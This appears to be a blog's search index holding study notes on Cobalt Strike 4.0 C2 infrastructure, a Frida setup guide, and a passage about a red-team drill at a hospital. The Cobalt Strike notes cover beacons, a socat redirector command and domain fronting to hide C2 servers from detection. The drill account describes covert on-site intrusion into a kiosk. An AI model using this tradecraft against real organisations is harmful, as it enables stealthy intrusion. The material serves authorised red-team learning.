<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Cobalt Strike 4.0第二节Infrastructure笔记</title>
      <link href="/2021/12/04/cobalt%20strike2-Infrastructure/"/>
      <url>/2021/12/04/cobalt%20strike2-Infrastructure/</url>
      
        <content type="html"><![CDATA[<blockquote><p>这是cobalt strike 4.0官方教程的第二节观看笔记笔记。两年之前的课一直拖到现在才写。。。</p><p>配合视频食用效果更佳！</p></blockquote><iframe height="500" width="700" src="//player.bilibili.com/player.html?aid=838038396&bvid=BV1ug4y167Y3&cid=187404444&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"> </iframe><a id="more"></a><h2 id="内容概要"><a href="#内容概要" class="headerlink" title="内容概要"></a>内容概要</h2><ol><li>监听器管理</li><li>不同Beacon Payload介绍<ul><li>HTTP/HTTPS Beacon</li><li>DNS beacon</li><li>SMB Beacon 和 TCP Beacon</li><li>外置C2 （C2就是 Command &amp; Control Server 的简称，也就是命令与控制服务器）</li></ul></li></ol><h2 id="一、什么是监听器？"><a href="#一、什么是监听器？" class="headerlink" title="一、什么是监听器？"></a>一、什么是监听器？</h2><p>监听器是cobalt strike payload的一项配置</p><p>一个监听器既是一个 payload 的配置信息，同时又是 Cobalt Strike 起一个服务器来接收来自这个<br>payload 的连接的指示。一个监听器由用户定义的名称、payload 类型和几个特定于 payload 的选项组<br>成。</p><h2 id="二、cobalt-strike中的监听器类型"><a href="#二、cobalt-strike中的监听器类型" class="headerlink" title="二、cobalt strike中的监听器类型"></a>二、cobalt strike中的监听器类型</h2><ul><li><p>egress：beacon通过网络作为出口的payload</p></li><li><p>peer to peer：该种监听器通过父payload进行通信，主要用于pivoting(“跳板攻击”)</p></li><li><p>alias：有关其他工具payload控制器的参考</p><p>下表为各种类型payload的特性</p><p><img src="https://cdn.jsdelivr.net/gh/cluren/imgHosting/img/20210127151745.png" alt="image-20210127151744938"></p></li></ul><p>在菜单栏点击<code>Cobalt Strike-&gt;Listeners</code>就可以看到监听器管理页面，在这里可以添加、编辑、删除监听器等操作。添加新的监听器需要输入监听器的名称并选择相应的payload。(作者建议：监听器名称最好有足够的描述性，这样可以方便队友了解其作用以及特性)</p><p><img src="https://cdn.jsdelivr.net/gh/cluren/imgHosting/img/20210127151051.png" alt="image-20210127151044309"></p><h2 id="三、Payload-Staging"><a href="#三、Payload-Staging" class="headerlink" title="三、Payload Staging"></a>三、Payload Staging</h2><ol><li><p>什么是stager？</p><p>stager 是一个小程序，通常是手工优化的汇编指令，用于下载一个payload stage，把它注入内存，然后对其传达执行命令。这个过程被称为 staging。</p><p>staging过程：C2将stager发送到目标，目标会以get的方式请求C2，然后C2会返回相关payload的相应给目标。</p><p>​    Metasploit与Cobalt Strike的staging协议是相同的，Metasploit的攻击可以无    缝衔接给Cobalt Strike，同样Cobalt Strike的session也可以传递给Metasploit，也可以传递给并不是自己连接到的Cobalt Strike实例中去。</p><p>staging示意图：</p><p><img src="https://cdn.jsdelivr.net/gh/cluren/imgHosting/img/20210127174655.png" alt="image-20210127174655870"></p></li><li><p>payload分为两种</p><p>stageless类型的：没有stager的payload，直接传送payload到目标。</p><p>stager类型的：将payload分阶段传送到目标中。相比stageless类型的payload而言，这种类型的不安全，容易出错，更容易被侦察到。但是在有些限制条件比较苛刻的环境中不得不用stager来分阶段传输payload。</p><p><img src="https://cdn.jsdelivr.net/gh/cluren/imgHosting/img/20211204151335.png" alt="image-20211009125650488"></p></li></ol><p>cobalt strike3中的payload都默认使用了stager，cobalt strike4中可供选择。</p><h2 id="四、HTTP-Beacon的工作原理"><a href="#四、HTTP-Beacon的工作原理" class="headerlink" title="四、HTTP Beacon的工作原理"></a>四、HTTP Beacon的工作原理</h2><p>如下图所示：左边的绿色框代表C2服务器，右边紫色框中的红点代表Beacon payload，紫色的框代表Beacon payload所在的进程。</p><p>HTTP Beacon设置有一个心跳时间，默认为60秒，sleep命令可以设置睡眠时间，每次心跳时间过后目标就会跟C2服务器进行通信。</p><p>每次“心跳”HTTP Beacon就会以GET请求的方式向C2服务器发送数据，询问C2是否有需要执行的任务(图中红色线段表示)，如果没有则Beacon进入休眠，直到心跳时间过后再次请求询问，如果有需要执行的任务则C2会返回响应，返回一组加密的数据(图中未表示)，其中包含payload要执行的任务。</p><p>如果payload在目标中产生输出则会以POST的请求方式传回给C2(图中黄色线段表示)，同样会以一组加密的数据进行返回(图中黄色方块表示)。只有产生输出时才会发送POST请求。</p><p><img src="https://cdn.jsdelivr.net/gh/cluren/imgHosting/img/20211204151347.png" alt="image-20210127182154841"></p><h2 id="五、HTTP-Beacon监听器配置"><a href="#五、HTTP-Beacon监听器配置" class="headerlink" title="五、HTTP Beacon监听器配置"></a>五、HTTP Beacon监听器配置</h2><p>在菜单栏点击<code>Cobalt Strike-&gt;Listeners-&gt;</code>点击下方的<code>Add</code>就会弹出监听器配置对话框。</p><p>在设置完监听器的名称和payload类型后，这里对HTTP Beacon的监听器的相关配置进行说明。</p><p><img src="https://cdn.jsdelivr.net/gh/cluren/imgHosting/img/20210131105058.png" alt="image-20210131105051344"></p><p>HTTP Host需要填的就是Beacon的回连主机，回连主机可以填ipv4、ipv6的地址或者域名，一次填入多个地址可以用逗号进行分隔，ipv6的地址需要用方括号（’[]’）扩起来。按 [+] 来为 HTTP Beacon 增加一个或多个回连的主机，按 [-] 来移除一个或多个主机，按 [X] 来清除当前的主机。</p><p>HTTP Host(Stager)填的是stager的主机，也可以设置默认不使用stager。</p><p>HTTP port(c2)就是Beacon回连c2的端口，默认为80。</p><p>HTTP Proxy是Beacon Payload的代理设置。如下图所示，在对话框的最下方有个打勾选项，打勾后会忽略代理配置，使用直接连接。这里的设置只对Beacon Payload起作用，不对stager起作用。<img src="https://cdn.jsdelivr.net/gh/cluren/imgHosting/img/20210201144223.png" alt="image-20210201144216053"></p><h2 id="六、HTTPS-Beacon"><a href="#六、HTTPS-Beacon" class="headerlink" title="六、HTTPS Beacon"></a>六、HTTPS Beacon</h2><p>HTTPS Beacon除了使用SSL外，其他跟HTTP Beacon都是类似的，SSL证书可以通过Malleable C配置文件来导入，关于详细内容作者建议去看Mealleable C2的文档（<a href="https://www.cobaltstrike.com/help-malleable-c2#validssl）。" target="_blank" rel="noopener">https://www.cobaltstrike.com/help-malleable-c2#validssl）。</a></p><h2 id="七、重定向（代理）"><a href="#七、重定向（代理）" class="headerlink" title="七、重定向（代理）"></a>七、重定向（代理）</h2><p>重定向器是位于目标网络与你的Cobalt Strike实例之间的服务，将目标网络流量转发到你的Cobalt Strike实例。重定向是Beacon回连到你的团队服务器所在位置的一种方法，同时也可以在渗透测试中隐藏自己的真实ip，多个重定向可以为你提供多个ip地址。</p><p>下图所示r1，r2，r3为三个重定向器。</p><p><img src="https://cdn.jsdelivr.net/gh/cluren/imgHosting/img/20210201155937.png" alt="image-20210201155937248"></p><p>作者在此推荐了三种方法：</p><ol><li>重定向可以使用工具iptables、socat等工具将流量转发至团队服务。</li></ol><p>​    socat工具使用：<code>socat TCP-LISTEN:80,fork TCP4:[team server]:80</code></p><p>（实操演示详见视频27:50） </p><ol start="2"><li><p>也可以使用Apache或者Nginx的反向代理来做重定向。</p></li><li><p>使用CDN来做HTTPS的流量转发。</p></li></ol><p>对于CDN做重定向的建议：</p><ol><li>使用有效的SSL证书。(很多CDN都会要求)使用Beacon的有效SSL证书：<a href="https://www.cobaltstrike.com/help-malleable-c2#validssl" target="_blank" rel="noopener">Malleable Command and Control - Cobalt Strike</a></li><li>确保CDN可以以POST和GET方式发送信息到团队服务器。</li><li>HTTP-GET only C2（下节课介绍）</li><li>禁用所有的缓存（为了确保重定向的请求到达CDN后转发到cobalt strike服务器）</li><li>注意转换处理后的请求（有些CDN会对你的请求做一些处理，这会导致cs服务器与beacon之间的通信数据与你预先在Malleable C2设置的不同从而打乱cs服务器与beacon的通信，假如你使用cookie数据来进行传递任务，而亚马逊的 CloudFront(CDN)会重新排列cookie。）</li></ol><p>为了避免出错可以设置Mealleable C2配置文件使得HTTP GET既可以下载任务，也可以将数据发送回Cobalt Strike。</p><h2 id="八、域前端技术"><a href="#八、域前端技术" class="headerlink" title="八、域前端技术"></a>八、域前端技术</h2><p>Domain Fronting翻译作域前端或者域前置，是一种隐藏C2真实地址的技术，可用来绕过安全设备的检测。首先要了解CDN的原理：客户端向发出的请求首先经过CDN服务器，CDN服务器检查自己本地是否有客户端的请求内容，如果有直接从CDN服务器返回给客户，如果没有则向客户源服务器进行请求，并将请求的返回结果添加到自己的缓存中。将CDN作为代理最好关闭CDN的缓存功能，使得每次请求都能到达源服务器。</p><p><strong>先来谈谈普通的CDN做代理技术</strong></p><p>CDN服务商为自己的客户提供服务，这其中就有很多比较知名的、信誉良好的一些客户，或者说信誉良好的一些域名。我们的C2服务器也是CDN的客户服务器之一。正常情况下，客户的请求先发送到CDN服务器，CDN服务器本地没有缓存的时候就转发给对应的客户源服务器。下图所示的三个请求中，请求域名“O”的请求被转发到“O”的源服务器，请求域名“T”的请求被转发到“T”的源服务器，请求C2的请求被转发到C2服务器。</p><p><img src="https://cdn.jsdelivr.net/gh/cluren/imgHosting/img/20211204151411.png" alt="image-20210615151308141"></p><p>利用CDN做代理的好处就是我们的C2服务器和其他CDN客户所使用的ip都是CDN服务商统一提供的，一般不会被认定为是恶意ip。</p><p>域前端的思想：客户端向域名T发送的请求到达CDN后，CDN并不会转发到T客户服务器，而是发给了C2服务器。（如下图所示）</p><p><img src="https://cdn.jsdelivr.net/gh/cluren/imgHosting/img/20211204151422.png" alt="image-20210615152656940"></p><p>这在外部看来就是客户端在跟“T”进行正常通信，但实际上，是在和C2服务器通信，但使用的却是一个良好信誉的域名“T”，“T”在这里的作用就像是你的重定向服务器。</p><p>原理：域前端的核心思想是在不同的通信层使用不同的域名。客户端发出一个请求，请求X域名，首先做DNS解析，得到的是CDN的IP地址，然后客户端根据解析到的IP访问到CDN，当请求到达CDN后，CDN并不关心你在访问到他之前请求DNS解析的是哪个域名，他只知道他收到了一个请求，你与他建立了TCP连接，这个连接经过CDN解析后才会知道他（CDN服务器）需要返回哪些缓存或者去请求哪个源服务器。所以问题的关键就在于CDN是如何从请求中进行解析获取客户要访问的源服务器呢？HTTP/HTTPS请求头中都会有HOST字段，CDN收到请求后就根据HOST的值来确定要返回的资源来自哪个源服务器。而Beacon的请求就可以自定义指定HOST的值，这样就可以将看似走向其他域名的请求转最终到达C2服务器。如下图，客户端请求的是T，但是HOST的值为C2，CDN收到后请求的是C2的资源。</p><p><img src="https://cdn.jsdelivr.net/gh/cluren/imgHosting/img/20211204151436.png" alt="image-20210615160920955"></p><p><strong>域前端技术的防范与突破</strong></p><p>如果客户端与CDN之间存在代理服务器（下图中的P），那么客户端发送到CDN的请求数据在代理服务器那里是完全透明可见的，代理服务器会检测到客户端发出的HTTP请求中请求的是T，但是HOST的值却是C2，这时候代理服务器可能就会去修改HOST的值，将C2改为T。然后，当请求到达CDN后，CDN请求的就是源服务器T了。</p><p><img src="https://cdn.jsdelivr.net/gh/cluren/imgHosting/img/20211204151454.png" alt="image-20210615161617303"></p><p>当客户端以HTTPS的方式发出请求时，代理服务器一般只是作为中转的作用，因为客户端发出的请求包是加密的，代理服务器并不知道请求包的内容。这时候请求通过代理服务器后被发送到CDN，CDN检测到HOST的值是C2，所以会向C2进行请求（如下图）。</p><p><img src="https://cdn.jsdelivr.net/gh/cluren/imgHosting/img/20211204151500.png" alt="image-20210615162538664"></p><p>但是在有些设备会解密获取到HTTPS包的内容，这样就会跟上面所说的HTTP的情况相同。但是一般不会对所有的目标都进行数据包的检测，比如一些值得信赖的域名，像金融或者医疗保健行业的请求数据包，此类数据包中可能包含金融账户密码或者医疗保健信息。所以对于一些特定的域名可能会被放行，这点就可以作为突破口。</p><p><strong>CDN对域前端防范</strong></p><p>对于域前端技术，CDN提供商也做了相应的措施，有些CDN会检测HTTPS请求包的SNI的值。</p><p>先来了解一下SNI，SNI的全称是Server Name Indication，他是用来改善服务器与客户端 SSL (Secure Socket Layer)和 TLS (Transport Layer Security) 的一个扩展。他的作用是支持一台服务器上可以为多个域名提供服，也就是允许多个DNS主机名由同一IP地址上的单个服务器（通常为Web服务器）托管。<br>SNI介绍：<a href="https://www.jianshu.com/p/119e5fc204eb" target="_blank" rel="noopener">SNI协议分析 - 简书 (jianshu.com)</a></p><p><a href="https://blog.csdn.net/makenothing/article/details/53292335" target="_blank" rel="noopener">SNI(Server Name Indication)_浴血重生-学习空间-CSDN博客</a></p><p>在客户端连接CDN之前，客户端在DNS请求中使用的是无害的值得信赖的域名来进行访问，在HTTPS包中SNI的值也是使用该域名，虽然可能代理服务器只知道SNI的值而不知道HOST的值，在他看来这个请求是正常的，但是CDN会检测SNI的值以此作为确定寻找源服务器的依据，当CDN服务器检测到SNI的值与HOST的值不同时，他会修改HOST的值。如下图，原本的数据包SNI的值为T，HOST的值为c2，CDN将其改为T。</p><p><img src="https://cdn.jsdelivr.net/gh/cluren/imgHosting/img/20211204151511.png" alt="image-20210617111027011"></p><p>在cobalt strike4以后使用域前端时，在建立cobaltstrike监听器时可以为stager设置HTTP Host Header（下图中HTTP Host Header字段），这样设置后beacon跟C2发送的数据包中Host Header都会使用设置的值。下图为cobaltstrike4.0的监听器配置信息。</p><p><img src="https://cdn.jsdelivr.net/gh/cluren/imgHosting/img/20211204151521.png" alt="image-20211202203857807"></p><h2 id="九、Cobalt-Strike-的整合"><a href="#九、Cobalt-Strike-的整合" class="headerlink" title="九、Cobalt Strike 的整合"></a>九、Cobalt Strike 的整合</h2><p>在之前的cobalt strike版本中，建立的监听器只能有一种类型的，比如建立了一个普通的HTTP监听器，再建立一个另一种流量特征的监听器比如GET-only（beacon请求和返回数据只使用GET方式传送数据）则需要在一个新的C2服务器上建立，而在cobalt strike4中可以将不同类型的监听器全部整合在一个C2服务器上。</p><p>下图为cobalt strike3.x的http监听器建立</p><p><img src="https://cdn.jsdelivr.net/gh/cluren/imgHosting/img/20211204151531.png" alt="image-20211202210054583"></p><p>cobalt strike4之后可以建立多个不同特征和类型的监听器，可以在beacon和C2服务器直接做一个重定向的代理服务器，将流量转发到C2的指定端口，还可以使用cobalt strike4中新增的”variants”文件来为每个监听器定制不同的流量特征。（有关variants文件的相关介绍在第三节课）</p><p>Variants文件介绍：<a href="https://fortynorthsecurity.com/blog/cobalt-strike-variants/" target="_blank" rel="noopener">Cobalt Strike 4.0 - Variants (fortynorthsecurity.com)</a></p><p>下图为cobalt strike4.0的http监听器和tcp监听器建立</p><p><img src="https://cdn.jsdelivr.net/gh/cluren/imgHosting/img/20211204151536.png" alt="image-20211202200618192"></p><h2 id="十、DNS-Beacon"><a href="#十、DNS-Beacon" class="headerlink" title="十、DNS Beacon"></a>十、DNS Beacon</h2><p>DNS beacon是使用DNS协议进行DNS查询来与C2在internet上通信的一种beacon。</p><p><img src="https://cdn.jsdelivr.net/gh/cluren/imgHosting/img/20211204151545.png" alt="image-20211202210131458"></p><p>原理：</p><p>如上图所示，目标主机中的beacon发出对域名1234.profiles.losenolove.com的DNS查询。</p><ol><li><p>第一步：目标主机对Local DNS Server（本地DNS服务器）发起查询，询问是否知道1234.profiles.losenolove.com对应的ip，Local DNS Server并不知道，此时Local DNS Server会进行迭代查询。</p></li><li><p>第二步：当Local DNS Server本地缓存中没有1234.profiles.losenolove.com的DNS解析信息时他会请求Root Sever，询问Root Sever是否知道1234.profiles.losenolove.com对应的ip地址，而Root Sever并不不知道，但是他会返回.com域名服务器的地址，让Local DNS Server去在.com服务器进行查找。</p></li><li><p>第三步：Local DNS Server对.com服务器进行询问，同理，.com返回的是losenolove.com的地址。</p></li><li><p>第四步：Local DNS Server对losenolove.com进行查询，同理，losenolove.com返回了profiles.losenolove.com的地址，让Local DNS Server去找profiles.losenolove.com进行查询，而profiles.losenolove.com对应的IP正是C2的地址。</p></li><li><p>第五步：Local DNS Server对profiles.losenolove.com（即C2服务器）进行查询，C2服务器收到查询的域名1234.profiles.losenolove.com解析1234的含义，如果有任务进行执行，则返回相应的数据给Local DNS Server，Local DNS Server收到响应后将对应的查询结果数据返回给目标主机，DNS beacon将解析返回的数据并执行相应的任务。如果没有需要执行的任务，则profiles.losenolove.com（即C2服务器）会返回一个提前设定好的值，如0.0.0.0。</p></li></ol><p>下图为DNS监听器的配置</p><p><img src="https://cdn.jsdelivr.net/gh/cluren/imgHosting/img/20211204151553.png" alt="image-20211202212900757"></p><p>在之前版本的DNS beacon的通信中，每隔心跳时间后DNS beacon会以DNS查询的方式与C2进行通信，询问是否有任务执行，如果有会返回相应的数据，如ip地址，此时beacon会发出HTTP请求去下载执行任务，作者说这样做的原因是在没有任务要执行的时候减少不必要的http通信来隐藏beacon。但是如果防火墙设置了DNS可以通过HTTP无法通过时就会遇到虽然有beacon，但是却无法下发任务去执行的处境。因此在Cobalt Strike4.0之后添加了DNS协议数据的通信，而不再使用DNS和HTTP混合的模式，默认使用dns-txt。</p><p>可以使用mode命令来更改通信信道：</p><ul><li><p>mode dns 是 DNS A 记录数据通道； </p></li><li><p>mode dns6 是 DNS AAAA 记录数据通道； </p></li><li><p>mode dns-txt 是 DNS TXT 记录数据通道。DNS TXT 记录是默认的数据通道。</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/cluren/imgHosting/img/20211204151559.png" alt="image-20211202215031890"></p><p><strong>DNS beacon的配置</strong></p><p>DNS beacon建立的目标是使C2服务器成为对应域名或子域名的权威域名服务器，让C2服务器去解析该子域名。即C2为域名解析服务器。</p><p>创建一个 DNS A记录然后指向你的Cobalt Strike团队服务器使用 DNS NS记录来将多个域名或子域名委派到你的Cobalt Strike团队服务器的A记录。</p><p><img src="https://cdn.jsdelivr.net/gh/cluren/imgHosting/img/20211204151607.png" alt="image-20211202220604011"></p><p>使用nslookup来检测是否设置成功，如果你得到了一个 0.0.0.0 （默认返回值，可修改）的 A 记录回复说明你的DNS配置是对的。如果你没有得到回复，那说明你的 DNS 配置不对。</p><h2 id="十一、SMB-Beacon"><a href="#十一、SMB-Beacon" class="headerlink" title="十一、SMB Beacon"></a>十一、SMB Beacon</h2><p><img src="https://cdn.jsdelivr.net/gh/cluren/imgHosting/img/20211204151709.png" alt="image-20211203131817635"></p><p>SMB beacon是使用windows命名管道（Named Pipes）进行通信的一种payload，通过父beacon来跟C2通信。因为命名管道使用SMB协议来传输流量因此称为SMB beacon。</p><p><strong>断开与重连</strong></p><p>SMB beacon可以在不必要通信的时候断开连接状态，即SMB beacon与他的父beacon断开连接进入待连接状态，在需要使用的时候再次恢复连接即可。</p><p>连接到一个SMB beacon：<code>link [host] [pipe]</code> #第二个参数管道名称可以使用Tab键补齐。</p><p>断开一个SMB beacon：<code>unink  [host] [pid]</code></p><p>连接时候错误代码：</p><ul><li>2 ：文件未找到，即没有找到要连接的这个beacon。</li><li>5： 没有权限连接到这个beacon，即没有权限访问该命名管道。</li><li>53： 与目标系统没有建立信任关系，无法与目标主机进行通信。</li></ul><p>Cobalt Strike的Pivo Graph视图模式可以清楚的看到当前SMB beacon与父benacon之间的连接关系。</p><p><img src="https://cdn.jsdelivr.net/gh/cluren/imgHosting/img/20211204151718.png" alt="image-20211203134213706"></p><h2 id="十二、TCP-Beacon"><a href="#十二、TCP-Beacon" class="headerlink" title="十二、TCP Beacon"></a>十二、TCP Beacon</h2><p>TCP beacon与SMB beacon类似，都是通过父beacon来与C2服务器进行通信。TCP beacon使用TCP socket来通信。</p><p>同样可以断开来连接和重新连接：</p><ul><li><p>连接到TCP beacon：<code>connect [host] [port]</code> # 也可以使用Tab键补齐</p></li><li><p>断开连接：<code>unlink [host] [pid]</code></p></li></ul><h2 id="十三、外置C2（External-C2）"><a href="#十三、外置C2（External-C2）" class="headerlink" title="十三、外置C2（External C2）"></a>十三、外置C2（External C2）</h2><p>外置 C2 是一种规范，允许第三方程序充当Cobalt Strike的Beacon payload 的通信层。这些第三方程序连接到Cobalt Strike来阅读预定使用的帧，并使用以此种方式控制的payload的输出写帧。这些第三方程序使用外置C2服务器来与你的 Cobalt Strike 团队服务器交互。</p><p><img src="https://cdn.jsdelivr.net/gh/cluren/imgHosting/img/20211204151733.png" alt="image-20211204133859954"></p><p>上图为External C2的数据流图，左上角和右下角黄色块的分别为cobalt strike的服务端和目标系统的SMB beacon，在这两者直接的两个绿色块就是第三方程序或者控制工具。也就是说，在cobalt strike的通信层使用第三方的工具或程序来实现。</p><p>不同于其他类型的监听器，外部C2监听器只是监听指定的端口，并与第三方程序服务端或接口进行通信。</p><p><img src="https://cdn.jsdelivr.net/gh/cluren/imgHosting/img/20211204151802.png" alt="image-20211204140635240"></p><p>官方介绍：<a href="https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/listener-infrastructue_external-c2.htm#_Toc65482746" target="_blank" rel="noopener">External C2 (helpsystems.com)</a></p><p>案       例：</p><ul><li><a href="https://labs.f-secure.com/archive/tasking-office-365-for-cobalt-strike-c2/" target="_blank" rel="noopener">“Tasking” Office 365 for Cobalt Strike C2 (f-secure.com)</a></li><li><a href="https://github.com/FSecureLABS/C3" target="_blank" rel="noopener">FSecureLABS/C3: Custom Command and Control (C3). A framework for rapid prototyping of custom C2 channels, while still providing integration with existing offensive toolkits. (github.com)</a></li></ul><p>视频演示：<a href="https://www.youtube.com/watch?v=7FqCDWRMm4A" target="_blank" rel="noopener">External C2 (Cobalt Strike 4.0) - YouTube</a></p><h2 id="相关参考"><a href="#相关参考" class="headerlink" title="相关参考"></a>相关参考</h2><ol><li><p><a href="https://www.youtube.com/watch?v=5gwEMocFkc0&t=1745s" target="_blank" rel="noopener">Red Team Ops with Cobalt Strike (2 of 9): Infrastructure - YouTube</a></p></li><li><p><a href="https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/welcome_main.htm" target="_blank" rel="noopener">Welcome to Cobalt Strike (helpsystems.com)</a></p></li><li><p><a href="https://blog.csdn.net/makenothing/article/details/53292335" target="_blank" rel="noopener">SNI(Server Name Indication)_浴血重生-学习空间-CSDN博客</a></p></li><li><p><a href="http://www.manongjc.com/article/103877.html" target="_blank" rel="noopener">Cobalt Strike的高使用率重定向器和域前端 - 码农教程 (manongjc.com)</a></p></li><li><p><a href="https://www.bamsoftware.com/papers/fronting/" target="_blank" rel="noopener">Blocking-resistant communication through domain fronting (bamsoftware.com)</a></p></li><li><p><a href="https://blog.cobaltstrike.com/2014/01/14/cloud-based-redirectors-for-distributed-hacking/" target="_blank" rel="noopener">Cloud-based Redirectors for Distributed Hacking - Cobalt Strike Research and Development</a></p></li><li><p><a href="https://fortynorthsecurity.com/blog/cobalt-strike-variants/" target="_blank" rel="noopener">Cobalt Strike 4.0 - Variants (fortynorthsecurity.com)</a></p></li><li><p><a href="https://www.anquanke.com/post/id/190207#h2-0https://rcoil.me/2019/11/[知识回顾]命名管道/" target="_blank" rel="noopener">Windows 命名管道研究初探 - 安全客，安全资讯平台 (anquanke.com)</a></p></li><li><p>Cobalt Strike 4.0 手册（奇安信A-Team翻译版）</p></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> 工具 </tag>
            
            <tag> 渗透测试 </tag>
            
            <tag> cobalt strike </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Frida初体验-Frida的使用学习</title>
      <link href="/2021/11/16/Frida%E5%88%9D%E4%BD%93%E9%AA%8C-Frida%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"/>
      <url>/2021/11/16/Frida%E5%88%9D%E4%BD%93%E9%AA%8C-Frida%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-环境配置及安装"><a href="#0x01-环境配置及安装" class="headerlink" title="0x01 环境配置及安装"></a>0x01 环境配置及安装</h2><p><strong>概述</strong></p><p>Frida是一款跨平台使用的，面向开发人员、逆向工程师和安全研究人员的动态工具集。</p><p>Github地址：<a href="https://github.com/frida/frida" target="_blank" rel="noopener">frida/frida: Clone this repo to build Frida (github.com)</a></p><p><strong>Frida框架分为两部分</strong></p><ul><li>一部分是运行在系统上的交互工具frida CLI。</li><li>另一部分是运行在目标机器上的代码注入工具 frida-serve。</li></ul><p><strong>环境及安装</strong></p><p>可以使用python的pip来安装Frida，也可以使用npm来安装。以下安装以windows环境下python3.8以及安卓模拟器环境为例。(使用旧版本python安装新版本frida在使用过程中可能会出现错误)</p><p>在python环境的windows电脑上执行以下命令安装frida环境。</p><p><code>pip install frida</code></p><p><code>pip install frida-tools</code></p><p>安装完成执行命令 <code>frida --version</code>即可看到输出frida版本信息。</p><p>下载frida-server，选择对应cpu架构下载，一般电脑模拟器下载andriod-x86或者andriod-x86_64，安卓手机下载andriod-arm或者andriod-arm64。这里以x86架构处理器电脑安卓模拟器为例，下载andriod-x86。</p><p><img src="https://cdn.jsdelivr.net/gh/cluren/imgHosting/img/20211116200256.png" alt="img"></p><p><strong>运行Frida-server</strong></p><p>使用adb连接安卓设备，将下载到的frida-server push到安卓环境的目录下。</p><p>adb下载安装及使用参考：<a href="https://blog.csdn.net/weixin_43927138/article/details/90477966" target="_blank" rel="noopener">adb下载安装及使用_Dongs丶的博客-CSDN博客</a></p><p>使用<code>abd device</code> 命令查看到模拟器已经连接到adb的设备，我这里使用的是模拟器，如果使用安卓手机需要打开USB调试功能，并将手机连接至电脑。</p><p><img src="https://cdn.jsdelivr.net/gh/cluren/imgHosting/img/20211116201118.png" alt="image-20211116201112290"></p><p>将下载下来的frida-server文件解压出来，为了方便这里重命名位fridas。通过adb push到模拟器安卓存储目录下并执行该文件，操作步骤如下。</p><p>注：frida客户端和服务端版本不同可能会导致不成功</p><ol><li><p><code>adb push fridas /data/local/tmp</code> 使用adb将frida-server push到安卓环境/data/local/tmp目录下。</p></li><li><p><code>adb  forward tcp:27042 tcp:27042</code> 转发android TCP端口到本地。</p></li><li><p><code>adb shell</code> 进入安卓shell，赋予frida-server执行权限，并运行。（）</p></li></ol><p>注：如果有多个设备执行adb命令时需要加-s参数 ：<code>adb -s [模拟器ID] forward tcp:27042 tcp:27042</code> 。如果执行失败，需要执行<code>su</code>命令切换至root账号再进行操作。</p><p><img src="https://cdn.jsdelivr.net/gh/cluren/imgHosting/img/20211116231021.png" alt="image-20211116225256198"></p><p><code>frida-ps -U</code>测试环境，出现安卓设备的进程，说明环境配置成功。</p><p><img src="https://cdn.jsdelivr.net/gh/cluren/imgHosting/img/20211116231031.png" alt="image-20211116230201023"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Android </tag>
            
            <tag> 工具 </tag>
            
            <tag> Frida </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一次攻防演习中的近源尝试</title>
      <link href="/2021/11/11/%E4%B8%80%E6%AC%A1%E6%94%BB%E9%98%B2%E6%BC%94%E4%B9%A0%E4%B8%AD%E7%9A%84%E8%BF%91%E6%BA%90%E5%B0%9D%E8%AF%95/"/>
      <url>/2021/11/11/%E4%B8%80%E6%AC%A1%E6%94%BB%E9%98%B2%E6%BC%94%E4%B9%A0%E4%B8%AD%E7%9A%84%E8%BF%91%E6%BA%90%E5%B0%9D%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<h1 id="一次攻防演习中的近源尝试"><a href="#一次攻防演习中的近源尝试" class="headerlink" title="一次攻防演习中的近源尝试"></a>一次攻防演习中的近源尝试</h1><h2 id="0x00-背景"><a href="#0x00-背景" class="headerlink" title="0x00 背景"></a>0x00 背景</h2><p>前段时间参加了某市的一次攻防演练，分配到的目标暴露面较少，而且页面都是趋于静态的那种，最可恶的是某家医院直接关站。。。</p><p><img src="https://cdn.jsdelivr.net/gh/cluren/imgHosting/img/20211111213325.png" alt="image-20210727151402157"></p><p>以下文章主要记录本次过程的主要内容。</p><h2 id="0x01-准备工作"><a href="#0x01-准备工作" class="headerlink" title="0x01 准备工作"></a>0x01 准备工作</h2><p>由于第一天成果非常有限，因此准备去实地看看情况（在主办方允许近源的情况下），于是我们选择了关站的那家医院。</p><p>准备工具：由于是第一次，所以准备到的东西并不多，带了网线、USB无线网卡、U盘、自己的电脑、便携鼠标和键盘，还有口罩（除了防疫还可以遮住自己的脸不让保安注意到）。</p><p>准备利用的目标：第一件想到的就是wifi，如果能利用wifi进入核心生产区那最好了，还有就是挂号机等等的终端设备，以及暴露的网口，一些办公pc。</p><p>准备完毕就背上书包骑着小电动车出发了</p><p><img src="https://cdn.jsdelivr.net/gh/cluren/imgHosting/img/20211111213503.png" alt="image-20210727112356785"></p><h2 id="0x02-现场的情况"><a href="#0x02-现场的情况" class="headerlink" title="0x02 现场的情况"></a>0x02 现场的情况</h2><p>首先通过保安的监视和测温进入门诊大楼，进门之后映入眼帘的就是一个导航大屏终端，于是准备先从他下手。</p><img src="https://cdn.jsdelivr.net/gh/cluren/imgHosting/img/20211111213536.png" alt="image-20210727142951549" style="zoom:80%;" /><p>首先观察环境情况，这台终端机是用来介绍医院的楼层、科室等信息的，在后边有电源开关、USB接口，网线口插着网线。通过简单的触摸操作发现这是台安卓系统的机器，于是通过手势操作划出了他的三大功能键，一不小心就跳出了沙盒。</p><p>左右观望了一下没有保安之后就开始收集他的信息，ip地址是100.*.*.*，是个安卓5的操作系统，无法访问互联网，看来网线接的是医院的内部网络，这也就意味着没法种马通过公网上线，于是想着通过连接wifi给他出网，正好医院有公共上网的wifi，做个双网卡的跳板机岂不美哉！但是很不巧，wifi是打开了，但是搜不到信号。。。</p><p><img src="https://cdn.jsdelivr.net/gh/cluren/imgHosting/img/20211111213552.png" 